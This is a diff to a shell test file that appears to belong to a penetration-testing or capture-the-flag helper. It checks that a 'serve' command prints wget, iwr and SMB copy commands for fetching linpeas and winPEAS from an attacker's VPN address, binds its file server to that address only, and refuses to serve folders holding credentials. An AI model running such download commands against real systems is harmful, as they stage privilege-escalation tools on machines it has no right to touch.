@@ -56,14 +56,19 @@ out=$(dz serve ~/tools 8000)
 has "serve: URL with port" "http://10.10.14.7:8000" "$out"
 has "serve: linux download command" "wget http://10.10.14.7:8000/linpeas.sh -O /tmp/linpeas.sh" "$out"
 has "serve: windows download command" "iwr http://10.10.14.7:8000/winPEAS.exe -OutFile" "$out"
-has "serve: starts the server on the port, in the folder" "STARTED python3 -m http.server 8000 --directory ${HOME:A}/tools" "$out"
+has "serve: only on the VPN IP, on the port, in the folder" "STARTED python3 -m http.server 8000 --bind 10.10.14.7 --directory ${HOME:A}/tools" "$out"
 has "serve: port 80 has no :80" "http://10.10.14.7/linpeas.sh" "$(dz serve ~/tools)"
 nok "serve: missing folder fails" dz serve ~/nope
+mkdir -p ~/boxes/corp/exploits; print x > ~/boxes/corp/exploits/shell.elf
+has "serve: a box subfolder by name" "shell.elf" "$(dz serve exploits)"
+nok "serve: refuses the box folder (creds, .dropzone, notes)" dz serve ~/boxes/corp
+has "and says why" "holds your box files" "$(dz serve ~/boxes/corp 2>&1)"
+nok "serve: refuses your home folder" dz serve ~
 impacket-smbserver() { print "STARTED smb $*" }
 commands[impacket-smbserver]=impacket-smbserver
 out=$(dz serve smb ~/tools)
 has "serve smb: copy command" 'copy \\10.10.14.7\share\linpeas.sh .' "$out"
-has "serve smb: starts impacket" "STARTED smb -smb2support -port 445 share ${HOME:A}/tools" "$out"
+has "serve smb: only on the VPN IP" "STARTED smb -smb2support -ip 10.10.14.7 -port 445 share ${HOME:A}/tools" "$out"
 _dz_attacker_ip() { : }
 has "serve without VPN says why" "is down" "$(dz serve ~/tools 2>&1)"
 _dz_attacker_ip() { print 10.10.14.7 }
